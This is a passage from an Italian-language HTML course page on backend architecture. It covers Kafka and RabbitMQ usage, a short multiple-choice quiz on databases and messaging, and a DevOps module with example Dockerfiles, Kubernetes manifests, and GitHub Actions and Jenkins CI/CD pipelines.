    @Transactional
    public Order createOrder(OrderRequest request) {
        Order order = orderRepository.save(buildOrder(request));

        // KAFKA: Event sourcing - traccia TUTTO ciò che succede
        // I consumer possono rileggere, fare analytics, audit
        kafkaTemplate.send("order-events", order.getId().toString(),
            new OrderEvent(order, OrderEventType.CREATED));

        // RABBITMQ: Task queue - invia email di conferma
        // Non serve persistenza, serve routing a worker specifici
        rabbitTemplate.convertAndSend("notifications", "email.order.confirmation",
            new EmailNotification(order.getCustomerEmail(), "Order confirmed"));

        return order;
    }
}

// Kafka consumer per analytics (può rileggere lo storico)
@KafkaListener(topics = "order-events", groupId = "analytics")
public void trackForAnalytics(OrderEvent event) {
    analyticsService.track(event);
}

// Kafka consumer per search indexing (consumer group diverso)
@KafkaListener(topics = "order-events", groupId = "search-indexer")
public void indexForSearch(OrderEvent event) {
    elasticsearchService.index(event);
}

// RabbitMQ consumer per email (task queue, rimuove dopo processing)
@RabbitListener(queues = "email.order.confirmation")
public void sendConfirmationEmail(EmailNotification notification) {
    emailService.send(notification);
}</code></pre>

                <div class="info-box success">
                    <h4>Regola pratica</h4>
                    <p><strong>Kafka</strong>: "Cosa è successo?" (event log, audit, analytics, replay)<br>
                    <strong>RabbitMQ</strong>: "Cosa devo fare?" (task distribution, commands, notifications)</p>
                </div>
            </section>

            <!-- Quiz Section Module 4 -->
            <section class="quiz-section" id="modulo4-quiz">
                <h2>Interactive Challenge Quiz - Database & Messaging</h2>
                <p style="color: var(--text-secondary); margin-bottom: 30px;">Verifica la tua comprensione di database e sistemi di messaging.</p>

                <!-- Question 16 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q1.</span> In Kafka, se hai un topic con 6 partizioni e un consumer group con 8 consumer, cosa succede?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q16" id="q16a" value="a">
                            <label for="q16a">Kafka crea automaticamente 2 partizioni aggiuntive</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q16" id="q16b" value="b">
                            <label for="q16b">2 consumer resteranno idle senza partizioni assegnate</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q16" id="q16c" value="c">
                            <label for="q16c">I messaggi vengono distribuiti round-robin tra tutti gli 8 consumer</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q16" id="q16d" value="d">
                            <label for="q16d">Kafka lancia un'eccezione e rifiuta i consumer in eccesso</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q16')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q16"></div>
                </div>

                <!-- Question 17 -->
                <div class="quiz-question" data-correct="d">
                    <h4><span>Q2.</span> Quale tipo di Exchange RabbitMQ useresti per implementare un sistema di notifiche dove ogni evento deve essere ricevuto da TUTTI i subscriber (email, SMS, push)?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q17" id="q17a" value="a">
                            <label for="q17a">Direct Exchange con lo stesso routing key per tutte le queue</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q17" id="q17b" value="b">
                            <label for="q17b">Topic Exchange con pattern # per tutte le queue</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q17" id="q17c" value="c">
                            <label for="q17c">Headers Exchange con match policy "any"</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q17" id="q17d" value="d">
                            <label for="q17d">Fanout Exchange</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q17')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q17"></div>
                </div>

                <!-- Question 18 -->
                <div class="quiz-question" data-correct="c">
                    <h4><span>Q3.</span> Un sistema necessita di: (1) rileggere eventi passati per debug, (2) multiple applicazioni che processano gli stessi eventi indipendentemente, (3) ordine garantito per chiave. Quale soluzione è più adatta?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q18" id="q18a" value="a">
                            <label for="q18a">RabbitMQ con Durable Queues e message TTL lungo</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q18" id="q18b" value="b">
                            <label for="q18b">RabbitMQ con Topic Exchange e multiple queue</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q18" id="q18c" value="c">
                            <label for="q18c">Kafka con consumer groups separati e partitioning per key</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q18" id="q18d" value="d">
                            <label for="q18d">Redis Pub/Sub con persistenza attiva</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q18')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q18"></div>
                </div>

                <!-- Question 19 -->
                <div class="quiz-question" data-correct="a">
                    <h4><span>Q4.</span> In un sistema e-commerce, quale database type è più adatto per il CATALOGO PRODOTTI con attributi variabili (laptop ha CPU/RAM, vestiti hanno taglia/colore)?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q19" id="q19a" value="a">
                            <label for="q19a">Document DB (MongoDB) per schema flessibile</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q19" id="q19b" value="b">
                            <label for="q19b">SQL con Entity-Attribute-Value (EAV) pattern</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q19" id="q19c" value="c">
                            <label for="q19c">Graph DB per le relazioni tra prodotti</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q19" id="q19d" value="d">
                            <label for="q19d">Key-Value store (Redis) per performance</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q19')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q19"></div>
                </div>

                <!-- Question 20 -->
                <div class="quiz-question" data-correct="b">
                    <h4><span>Q5.</span> Qual è la principale differenza tra <code>acks=1</code> e <code>acks=all</code> nella configurazione di un Kafka Producer?</h4>
                    <div class="quiz-options">
                        <div class="quiz-option" data-value="a">
                            <input type="radio" name="q20" id="q20a" value="a">
                            <label for="q20a"><code>acks=all</code> invia il messaggio a tutti i consumer, <code>acks=1</code> solo a uno</label>
                        </div>
                        <div class="quiz-option" data-value="b">
                            <input type="radio" name="q20" id="q20b" value="b">
                            <label for="q20b"><code>acks=1</code> attende conferma solo dal leader, <code>acks=all</code> attende che tutti i replica abbiano scritto</label>
                        </div>
                        <div class="quiz-option" data-value="c">
                            <input type="radio" name="q20" id="q20c" value="c">
                            <label for="q20c"><code>acks=all</code> abilita la compressione, <code>acks=1</code> la disabilita</label>
                        </div>
                        <div class="quiz-option" data-value="d">
                            <input type="radio" name="q20" id="q20d" value="d">
                            <label for="q20d"><code>acks=1</code> è per messaggi transazionali, <code>acks=all</code> per messaggi normali</label>
                        </div>
                    </div>
                    <button class="check-btn" onclick="checkAnswer('q20')">Verifica Risposta</button>
                    <div class="feedback" id="feedback-q20"></div>
                </div>
            </section>

            <!-- Links Modulo 4 -->
            <section class="section" id="modulo4-links">
                <h2>Link di Approfondimento - Modulo 4</h2>

                <div class="info-box">
                    <h4>SQL & Relational Databases</h4>
                    <p><a href="https://www.postgresql.org/docs/" target="_blank">PostgreSQL Documentation</a></p>
                    <p><a href="https://use-the-index-luke.com/" target="_blank">Use The Index, Luke!</a> - SQL indexing e tuning</p>
                    <p><a href="https://www.baeldung.com/jpa-indexes" target="_blank">Baeldung: Database Indexes</a></p>
                </div>

                <div class="info-box">
                    <h4>NoSQL Databases</h4>
                    <p><a href="https://www.mongodb.com/docs/" target="_blank">MongoDB Documentation</a></p>
                    <p><a href="https://cassandra.apache.org/doc/latest/" target="_blank">Apache Cassandra Documentation</a></p>
                    <p><a href="https://redis.io/documentation" target="_blank">Redis Documentation</a></p>
                    <p><a href="https://www.baeldung.com/spring-data-redis-tutorial" target="_blank">Baeldung: Spring Data Redis</a></p>
                </div>

                <div class="info-box">
                    <h4>Apache Kafka</h4>
                    <p><a href="https://kafka.apache.org/documentation/" target="_blank">Apache Kafka Documentation</a></p>
                    <p><a href="https://www.confluent.io/learn/apache-kafka/" target="_blank">Confluent: Learn Kafka</a> - Tutorials e guide</p>
                    <p><a href="https://www.baeldung.com/spring-kafka" target="_blank">Baeldung: Spring Kafka</a></p>
                    <p><a href="https://developer.confluent.io/patterns/" target="_blank">Confluent: Event Streaming Patterns</a></p>
                </div>

                <div class="info-box">
                    <h4>RabbitMQ</h4>
                    <p><a href="https://www.rabbitmq.com/documentation.html" target="_blank">RabbitMQ Documentation</a></p>
                    <p><a href="https://www.cloudamqp.com/blog/part1-rabbitmq-for-beginners-what-is-rabbitmq.html" target="_blank">RabbitMQ for Beginners</a></p>
                    <p><a href="https://www.baeldung.com/rabbitmq" target="_blank">Baeldung: RabbitMQ</a></p>
                </div>
            </section>

            <!-- ============================================== -->
            <!-- MODULO 5: CLOUD & DEVOPS -->
            <!-- ============================================== -->

            <header class="module-header" id="modulo5">
                <span class="module-tag">Modulo 5</span>
                <h1>Cloud & DevOps</h1>
                <p>Containerization, orchestration e strategie di deployment per applicazioni moderne</p>
            </header>

            <!-- Docker Section -->
            <section class="section" id="modulo5-docker">
                <h2>Docker & Containerization</h2>

                <p><strong>Docker</strong> ha rivoluzionato il modo in cui sviluppiamo, testiamo e deployamo applicazioni. Un <em>container</em> è un'unità standardizzata di software che impacchetta il codice insieme a tutte le sue dipendenze, garantendo che l'applicazione funzioni in modo identico indipendentemente dall'ambiente di esecuzione.</p>

                <h3>Container vs Virtual Machine</h3>

                <p>La differenza fondamentale sta nel livello di virtualizzazione:</p>

                <div class="diagram">
<pre>
   VIRTUAL MACHINES                    CONTAINERS
┌─────────────────────┐          ┌─────────────────────┐
│   App A  │   App B  │          │   App A  │   App B  │
├──────────┼──────────┤          ├──────────┼──────────┤
│  Libs A  │  Libs B  │          │  Libs A  │  Libs B  │
├──────────┼──────────┤          ├──────────┴──────────┤
│ Guest OS │ Guest OS │          │   Container Engine  │
├──────────┴──────────┤          │      (Docker)       │
│     Hypervisor      │          ├─────────────────────┤
├─────────────────────┤          │      Host OS        │
│      Host OS        │          ├─────────────────────┤
├─────────────────────┤          │     Hardware        │
│     Hardware        │          └─────────────────────┘
└─────────────────────┘
</pre>
                </div>

                <table>
                    <thead>
                        <tr>
                            <th>Caratteristica</th>
                            <th>Virtual Machine</th>
                            <th>Container</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td>Isolamento</td>
                            <td>Completo (hardware virtualization)</td>
                            <td>A livello di processo (kernel sharing)</td>
                        </tr>
                        <tr>
                            <td>Boot time</td>
                            <td>Minuti</td>
                            <td>Millisecondi/secondi</td>
                        </tr>
                        <tr>
                            <td>Dimensione</td>
                            <td>GB (include intero OS)</td>
                            <td>MB (solo app + dipendenze)</td>
                        </tr>
                        <tr>
                            <td>Overhead</td>
                            <td>Alto (hypervisor + guest OS)</td>
                            <td>Minimo (condivide kernel host)</td>
                        </tr>
                        <tr>
                            <td>Portabilità</td>
                            <td>Limitata al tipo di hypervisor</td>
                            <td>Eccellente (OCI standard)</td>
                        </tr>
                    </tbody>
                </table>

                <h3>Dockerfile Best Practices</h3>

                <p>Un <strong>Dockerfile</strong> è un file di testo che contiene tutte le istruzioni per costruire un'immagine Docker. Scrivere Dockerfile efficienti è cruciale per build veloci e immagini sicure.</p>

                <pre><code class="language-dockerfile"># ❌ BAD: Non ottimizzato
FROM ubuntu:latest
RUN apt-get update
RUN apt-get install -y python3
RUN apt-get install -y python3-pip
COPY . /app
RUN pip install -r /app/requirements.txt
CMD ["python3", "/app/main.py"]

# ✅ GOOD: Ottimizzato
FROM python:3.11-slim AS base

# Non eseguire come root
RUN useradd --create-home appuser

WORKDIR /app

# Copia prima i file di dipendenze (cache layer)
COPY requirements.txt .
RUN pip install --no-cache-dir -r requirements.txt

# Poi copia il codice sorgente
COPY --chown=appuser:appuser . .

USER appuser

CMD ["python", "main.py"]</code></pre>

                <div class="info-box">
                    <h4>Principi chiave per Dockerfile efficienti</h4>
                    <ul>
                        <li><strong>Layer ordering</strong>: metti le istruzioni che cambiano meno frequentemente in alto (dipendenze prima del codice)</li>
                        <li><strong>Minimize layers</strong>: combina RUN commands con <code>&&</code> quando possibile</li>
                        <li><strong>Use specific tags</strong>: evita <code>:latest</code>, usa versioni esplicite come <code>:3.11-slim</code></li>
                        <li><strong>Non-root user</strong>: esegui sempre l'applicazione come utente non privilegiato</li>
                        <li><strong>.dockerignore</strong>: escludi file non necessari (node_modules, .git, __pycache__)</li>
                    </ul>
                </div>

                <h3>Multi-stage Builds</h3>

                <p>I <strong>multi-stage builds</strong> permettono di separare l'ambiente di build da quello di runtime, producendo immagini finali molto più piccole e sicure.</p>

                <pre><code class="language-dockerfile"># Stage 1: Build
FROM maven:3.9-eclipse-temurin-21 AS builder
WORKDIR /build
COPY pom.xml .
# Download dipendenze separatamente per sfruttare la cache
RUN mvn dependency:go-offline
COPY src ./src
RUN mvn package -DskipTests

# Stage 2: Runtime
FROM eclipse-temurin:21-jre-alpine
WORKDIR /app

# Crea utente non-root
RUN addgroup -S spring && adduser -S spring -G spring

# Copia SOLO il JAR dal builder stage
COPY --from=builder /build/target/*.jar app.jar

# Imposta utente non-root
USER spring:spring

# Health check
HEALTHCHECK --interval=30s --timeout=3s \
  CMD wget -q --spider http://localhost:8080/actuator/health || exit 1

EXPOSE 8080
ENTRYPOINT ["java", "-jar", "app.jar"]</code></pre>

                <p>Con questo approccio, l'immagine finale contiene <strong>solo</strong> il JRE e il JAR compilato, non Maven, il codice sorgente o le dipendenze di build. Il risultato è un'immagine che passa da ~500MB a ~150MB.</p>

                <h3>Layer Caching</h3>

                <p>Docker costruisce le immagini layer by layer. Ogni istruzione nel Dockerfile crea un nuovo layer, e Docker può riutilizzare i layer dalla cache se il contenuto non è cambiato.</p>

                <div class="diagram">
<pre>
         DOCKER BUILD CACHE MECHANISM

Dockerfile Instruction      Layer Cache Status
─────────────────────────────────────────────────
FROM node:20-alpine    →    [CACHED] ✓
WORKDIR /app           →    [CACHED] ✓
COPY package*.json .   →    [CACHED] ✓  ← Se package.json non cambia
RUN npm ci             →    [CACHED] ✓  ← npm install riusato!
COPY . .               →    [REBUILT] ✗ ← Codice cambiato
RUN npm run build      →    [REBUILT] ✗ ← Invalidato
─────────────────────────────────────────────────

⚠️  Una volta invalidato un layer, TUTTI i successivi
    vengono ricostruiti (cache invalidation cascade)
</pre>
                </div>

                <div class="info-box warning">
                    <h4>Attenzione: Cache Invalidation</h4>
                    <p>L'ordine delle istruzioni è critico. Se metti <code>COPY . .</code> prima di <code>RUN npm install</code>, ogni modifica al codice invaliderà la cache delle dipendenze, rendendo ogni build molto più lenta.</p>
                </div>

                <h3>Docker Compose per sviluppo locale</h3>

                <pre><code class="language-yaml"># docker-compose.yml
version: '3.8'

services:
  app:
    build:
      context: .
      dockerfile: Dockerfile
    ports:
      - "8080:8080"
    environment:
      - SPRING_PROFILES_ACTIVE=dev
      - DATABASE_URL=jdbc:postgresql://db:5432/myapp
    depends_on:
      db:
        condition: service_healthy
    volumes:
      - ./src:/app/src  # Hot reload in dev

  db:
    image: postgres:15-alpine
    environment:
      POSTGRES_DB: myapp
      POSTGRES_USER: user
      POSTGRES_PASSWORD: secret
    volumes:
      - postgres_data:/var/lib/postgresql/data
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U user -d myapp"]
      interval: 5s
      timeout: 5s
      retries: 5

  redis:
    image: redis:7-alpine
    ports:
      - "6379:6379"

volumes:
  postgres_data:</code></pre>
            </section>

            <!-- Kubernetes Section -->
            <section class="section" id="modulo5-kubernetes">
                <h2>Kubernetes (K8s)</h2>

                <p><strong>Kubernetes</strong> è una piattaforma open-source per l'orchestrazione di container. Automatizza il deployment, lo scaling e la gestione di applicazioni containerizzate. Originariamente sviluppato da Google, è ora mantenuto dalla Cloud Native Computing Foundation (CNCF).</p>

                <h3>Architettura di un Cluster Kubernetes</h3>

                <div class="diagram">
<pre>
                    KUBERNETES CLUSTER ARCHITECTURE

┌──────────────────────────────────────────────────────────────────┐
│                        CONTROL PLANE                              │
│  ┌─────────────┐  ┌─────────────┐  ┌───────────┐  ┌───────────┐  │
│  │ API Server  │  │  Scheduler  │  │Controller │  │   etcd    │  │
│  │             │  │             │  │  Manager  │  │ (storage) │  │
│  └──────┬──────┘  └──────┬──────┘  └─────┬─────┘  └───────────┘  │
└─────────┼────────────────┼───────────────┼───────────────────────┘
          │                │               │
          └────────────────┼───────────────┘
                           │
        ┌──────────────────┴──────────────────┐
        │                                      │
        ▼                                      ▼
┌───────────────────────────┐    ┌───────────────────────────┐
│      WORKER NODE 1        │    │      WORKER NODE 2        │
│  ┌─────────────────────┐  │    │  ┌─────────────────────┐  │
│  │       kubelet       │  │    │  │       kubelet       │  │
│  └─────────────────────┘  │    │  └─────────────────────┘  │
│  ┌─────────────────────┐  │    │  ┌─────────────────────┐  │
│  │     kube-proxy      │  │    │  │     kube-proxy      │  │
│  └─────────────────────┘  │    │  └─────────────────────┘  │
│  ┌────────┐ ┌────────┐   │    │  ┌────────┐ ┌────────┐   │
│  │  Pod   │ │  Pod   │   │    │  │  Pod   │ │  Pod   │   │
│  │┌──────┐│ │┌──────┐│   │    │  │┌──────┐│ │┌──────┐│   │
│  ││ App  ││ ││ App  ││   │    │  ││ App  ││ ││ App  ││   │
│  │└──────┘│ │└──────┘│   │    │  │└──────┘│ │└──────┘│   │
│  └────────┘ └────────┘   │    │  └────────┘ └────────┘   │
└───────────────────────────┘    └───────────────────────────┘
</pre>
                </div>

                <h3>Componenti fondamentali</h3>

                <h4>Pod</h4>
                <p>Il <strong>Pod</strong> è l'unità minima di deployment in Kubernetes. Rappresenta uno o più container che condividono storage, rete e specifiche su come eseguire i container. I container in un Pod condividono lo stesso indirizzo IP e possono comunicare via localhost.</p>

                <pre><code class="language-yaml"># pod.yaml - Definizione base di un Pod
apiVersion: v1
kind: Pod
metadata:
  name: my-app
  labels:
    app: my-app
    environment: production
spec:
  containers:
    - name: app
      image: my-registry/my-app:1.2.3
      ports:
        - containerPort: 8080
      resources:
        requests:          # Risorse minime garantite
          memory: "256Mi"
          cpu: "250m"      # 0.25 CPU core
        limits:            # Limiti massimi
          memory: "512Mi"
          cpu: "500m"
      livenessProbe:       # Il container è vivo?
        httpGet:
          path: /actuator/health/liveness
          port: 8080
        initialDelaySeconds: 30
        periodSeconds: 10
      readinessProbe:      # Il container può ricevere traffico?
        httpGet:
          path: /actuator/health/readiness
          port: 8080
        initialDelaySeconds: 5
        periodSeconds: 5
      env:
        - name: SPRING_PROFILES_ACTIVE
          value: "prod"
        - name: DB_PASSWORD
          valueFrom:
            secretKeyRef:
              name: db-credentials
              key: password</code></pre>

                <div class="info-box">
                    <h4>Liveness vs Readiness Probe</h4>
                    <ul>
                        <li><strong>Liveness Probe</strong>: verifica se il container è vivo. Se fallisce, Kubernetes <em>riavvia</em> il container. Usa questo per rilevare deadlock o stati corrotti.</li>
                        <li><strong>Readiness Probe</strong>: verifica se il container può ricevere traffico. Se fallisce, il Pod viene <em>rimosso</em> dal Service (niente restart). Usa questo durante startup o quando il Pod è temporaneamente sovraccarico.</li>
                    </ul>
                </div>

                <h4>Deployment</h4>
                <p>Un <strong>Deployment</strong> gestisce il ciclo di vita dei Pod, garantendo che il numero desiderato di repliche sia sempre in esecuzione. Fornisce rolling updates e rollback.</p>

                <pre><code class="language-yaml"># deployment.yaml
apiVersion: apps/v1
kind: Deployment
metadata:
  name: my-app
  labels:
    app: my-app
spec:
  replicas: 3
  selector:
    matchLabels:
      app: my-app
  strategy:
    type: RollingUpdate
    rollingUpdate:
      maxSurge: 1        # Max Pod extra durante update
      maxUnavailable: 0  # Zero downtime
  template:
    metadata:
      labels:
        app: my-app
    spec:
      containers:
        - name: app
          image: my-registry/my-app:1.2.3
          ports:
            - containerPort: 8080
          resources:
            requests:
              memory: "256Mi"
              cpu: "250m"
            limits:
              memory: "512Mi"
              cpu: "500m"</code></pre>

                <h4>Service</h4>
                <p>Un <strong>Service</strong> espone un'applicazione in esecuzione su un set di Pod come servizio di rete. I Service forniscono un DNS name stabile e load balancing tra i Pod.</p>

                <pre><code class="language-yaml"># service.yaml
apiVersion: v1
kind: Service
metadata:
  name: my-app-service
spec:
  type: ClusterIP          # Solo interno al cluster
  selector:
    app: my-app            # Seleziona i Pod con questo label
  ports:
    - port: 80             # Porta del Service
      targetPort: 8080     # Porta del container
      protocol: TCP</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Service Type</th>
                            <th>Visibilità</th>
                            <th>Use Case</th>
                        </tr>
                    </thead>
                    <tbody>
                        <tr>
                            <td><code>ClusterIP</code></td>
                            <td>Solo interno al cluster</td>
                            <td>Comunicazione tra microservizi</td>
                        </tr>
                        <tr>
                            <td><code>NodePort</code></td>
                            <td>Espone su ogni nodo (porta 30000-32767)</td>
                            <td>Testing, ambienti non-production</td>
                        </tr>
                        <tr>
                            <td><code>LoadBalancer</code></td>
                            <td>Espone via cloud load balancer</td>
                            <td>Traffico esterno in produzione (cloud)</td>
                        </tr>
                        <tr>
                            <td><code>ExternalName</code></td>
                            <td>Alias DNS per servizi esterni</td>
                            <td>Integrazione con servizi fuori dal cluster</td>
                        </tr>
                    </tbody>
                </table>

                <h4>Ingress</h4>
                <p><strong>Ingress</strong> gestisce l'accesso esterno ai servizi nel cluster, tipicamente HTTP/HTTPS. Fornisce load balancing, SSL termination e virtual hosting basato su nome.</p>

                <pre><code class="language-yaml"># ingress.yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: my-app-ingress
  annotations:
    nginx.ingress.kubernetes.io/rewrite-target: /
    cert-manager.io/cluster-issuer: "letsencrypt-prod"
spec:
  ingressClassName: nginx
  tls:
    - hosts:
        - api.mycompany.com
      secretName: api-tls-secret
  rules:
    - host: api.mycompany.com
      http:
        paths:
          - path: /users
            pathType: Prefix
            backend:
              service:
                name: user-service
                port:
                  number: 80
          - path: /orders
            pathType: Prefix
            backend:
              service:
                name: order-service
                port:
                  number: 80</code></pre>

                <h4>ConfigMaps e Secrets</h4>
                <p><strong>ConfigMaps</strong> e <strong>Secrets</strong> permettono di separare la configurazione dal codice dell'applicazione, seguendo il principio delle twelve-factor apps.</p>

                <pre><code class="language-yaml"># configmap.yaml
apiVersion: v1
kind: ConfigMap
metadata:
  name: app-config
data:
  application.properties: |
    server.port=8080
    logging.level.root=INFO
  FEATURE_FLAG_NEW_UI: "true"

---
# secret.yaml
apiVersion: v1
kind: Secret
metadata:
  name: db-credentials
type: Opaque
data:
  # Valori codificati in base64 (NON encrypted!)
  username: YWRtaW4=           # echo -n 'admin' | base64
  password: cGFzc3dvcmQxMjM=   # echo -n 'password123' | base64</code></pre>

                <div class="info-box warning">
                    <h4>Secrets non sono sicuri di default!</h4>
                    <p>I Secret Kubernetes sono solo base64 encoded, non encrypted. Per una gestione sicura dei secrets in produzione, considera: <strong>HashiCorp Vault</strong>, <strong>AWS Secrets Manager</strong>, <strong>Azure Key Vault</strong>, o <strong>Sealed Secrets</strong> per GitOps.</p>
                </div>

                <h4>Horizontal Pod Autoscaler (HPA)</h4>
                <p>L'<strong>HPA</strong> scala automaticamente il numero di Pod in un Deployment basandosi su metriche osservate (CPU, memoria, o metriche custom).</p>

                <pre><code class="language-yaml"># hpa.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: my-app-hpa
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: my-app
  minReplicas: 2
  maxReplicas: 10
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70    # Scala se CPU > 70%
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
  behavior:
    scaleDown:
      stabilizationWindowSeconds: 300  # Attendi 5 min prima di scale down
      policies:
        - type: Percent
          value: 10
          periodSeconds: 60</code></pre>
            </section>

            <!-- CI/CD Section -->
            <section class="section" id="modulo5-cicd">
                <h2>CI/CD Pipelines</h2>

                <p><strong>Continuous Integration</strong> (CI) è la pratica di integrare frequentemente il codice in un repository condiviso, con build e test automatici. <strong>Continuous Delivery/Deployment</strong> (CD) estende CI automatizzando il rilascio del software in ambienti di staging e produzione.</p>

                <div class="diagram">
<pre>
                    CI/CD PIPELINE FLOW

┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐    ┌─────────┐
│  CODE   │───▶│  BUILD  │───▶│  TEST   │───▶│ DEPLOY  │───▶│ MONITOR │
│  PUSH   │    │         │    │         │    │STAGING  │    │         │
└─────────┘    └─────────┘    └─────────┘    └────┬────┘    └─────────┘
                                                  │
     ┌────────────────────────────────────────────┘
     │
     ▼
┌──────────────────────────────────────────────────────────────────────┐
│                    PRODUCTION DEPLOYMENT                              │
│  ┌─────────────┐    ┌─────────────┐    ┌─────────────┐               │
│  │  Approval   │───▶│   Deploy    │───▶│  Validate   │               │
│  │  (manual?)  │    │  Strategy   │    │  & Rollback │               │
│  └─────────────┘    └─────────────┘    └─────────────┘               │
└──────────────────────────────────────────────────────────────────────┘
</pre>
                </div>

                <h3>GitHub Actions</h3>

                <p><strong>GitHub Actions</strong> è una piattaforma CI/CD integrata in GitHub. I workflow sono definiti in file YAML nella directory <code>.github/workflows/</code>.</p>

                <pre><code class="language-yaml"># .github/workflows/ci-cd.yml
name: CI/CD Pipeline

on:
  push:
    branches: [main, develop]
  pull_request:
    branches: [main]

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: ${{ github.repository }}

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4

      - name: Set up JDK 21
        uses: actions/setup-java@v4
        with:
          java-version: '21'
          distribution: 'temurin'
          cache: maven

      - name: Run tests
        run: mvn verify --batch-mode

      - name: Upload coverage report
        uses: codecov/codecov-action@v3
        with:
          files: target/site/jacoco/jacoco.xml

  build-and-push:
    needs: test
    runs-on: ubuntu-latest
    if: github.ref == 'refs/heads/main'
    permissions:
      contents: read
      packages: write

    steps:
      - uses: actions/checkout@v4

      - name: Log in to Container Registry
        uses: docker/login-action@v3
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Extract metadata for Docker
        id: meta
        uses: docker/metadata-action@v5
        with:
          images: ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}
          tags: |
            type=sha,prefix=
            type=ref,event=branch

      - name: Build and push Docker image
        uses: docker/build-push-action@v5
        with:
          context: .
          push: true
          tags: ${{ steps.meta.outputs.tags }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    needs: build-and-push
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - name: Deploy to Kubernetes
        uses: azure/k8s-deploy@v4
        with:
          manifests: |
            k8s/deployment.yaml
            k8s/service.yaml
          images: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production  # Richiede approval manuale
    steps:
      - name: Deploy to Production
        run: |
          # Deploy con strategia blue-green o canary
          kubectl set image deployment/my-app \
            app=${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}</code></pre>

                <h3>Jenkins Pipeline</h3>

                <p><strong>Jenkins</strong> è uno dei più diffusi automation server per CI/CD. I pipeline moderni usano la sintassi <em>Declarative Pipeline</em> definita in un <code>Jenkinsfile</code>.</p>

                <pre><code class="language-groovy">// Jenkinsfile
pipeline {
    agent {
        kubernetes {
            yaml '''
                apiVersion: v1
                kind: Pod
                spec:
                  containers:
                  - name: maven
                    image: maven:3.9-eclipse-temurin-21
                    command: ['sleep', 'infinity']
                  - name: docker
                    image: docker:24-dind
                    securityContext:
                      privileged: true
            '''
        }
    }

    environment {
        REGISTRY = 'ghcr.io/myorg'
        IMAGE_NAME = 'my-app'
    }

    stages {
        stage('Checkout') {
            steps {
                checkout scm
            }
        }

        stage('Test') {
            steps {
                container('maven') {
                    sh 'mvn verify'
                }
            }
            post {
                always {
                    junit 'target/surefire-reports/*.xml'
                    jacoco execPattern: 'target/jacoco.exec'
                }
            }
        }

        stage('Build Docker Image') {
            when {
                branch 'main'
            }
            steps {
                container('docker') {
                    script {
                        def image = docker.build("${REGISTRY}/${IMAGE_NAME}:${GIT_COMMIT}")
                        docker.withRegistry('https://ghcr.io', 'github-credentials') {
                            image.push()
                            image.push('latest')
                        }
                    }
                }
            }
        }

        stage('Deploy to Staging') {
            when {
                branch 'main'
            }
            steps {
                withKubeConfig([credentialsId: 'k8s-staging']) {
                    sh """
                        kubectl set image deployment/my-app \
                            app=${REGISTRY}/${IMAGE_NAME}:${GIT_COMMIT} \
                            -n staging
                        kubectl rollout status deployment/my-app -n staging
                    """
                }
            }
        }

        stage('Deploy to Production') {
            when {
                branch 'main'
            }
            input {
                message "Deploy to production?"
                ok "Deploy"
            }
            steps {
                withKubeConfig([credentialsId: 'k8s-production']) {
                    sh """
                        kubectl set image deployment/my-app \
                            app=${REGISTRY}/${IMAGE_NAME}:${GIT_COMMIT} \
                            -n production
                    """
                }
            }
        }
    }

    post {
        failure {
            slackSend channel: '#deploys',
                      color: 'danger',
                      message: "Build FAILED: ${env.JOB_NAME} #${env.BUILD_NUMBER}"
        }
        success {
            slackSend channel: '#deploys',
                      color: 'good',
                      message: "Build SUCCESS: ${env.JOB_NAME} #${env.BUILD_NUMBER}"
        }
    }
}</code></pre>

                <table>
                    <thead>
                        <tr>
                            <th>Aspetto</th>
                            <th>GitHub Actions</th>
                            <th>Jenkins</th>
                        </tr>
